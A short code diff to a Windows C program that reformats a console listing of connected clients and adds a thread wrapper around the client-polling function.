@@ -70,13 +70,18 @@ int GetClient(int WSAres)
 
         count++;
 
+        printf("\x1b[H");
+        printf("\x1b[J");
+
         printf(GREEN"\n\n\n================== CLIENTS ==================\n"BLACK);
-        printf(GREEN"\nID   IP      HOST"BLACK);
+        printf(GREEN"\nID             IP           HOST"BLACK);
 
         for (int i = 0; i < count; i++)
         {
-            printf(GREEN"\r\n[%d]   [%s]    [%s]"BLACK, i, clients[i].IP, clients[i].HOST);
+            printf(GREEN"\r\n[%d]       [%s]        [%s]"BLACK, i, clients[i].IP, clients[i].HOST);
         }
+
+        fflush(stdout);
 
     }
 
@@ -109,5 +114,19 @@ int GetId(char* argid, size_t size)
     printf(GREEN"\n[+] Client ["BLUE"%s"GREEN"] selected."BLACK, clients[id].HOST);
 
     return id;
+
+}
+
+DWORD WINAPI ThreadGetClient(void* arg)
+{
+
+    int WSAres = (*(int*)arg);
+    if (!GetClient(WSAres))
+    {
+        fprintf(stderr, "\n\afailed to call threaded gc");
+        return -1;
+    }
+
+    return 0;
 
 }
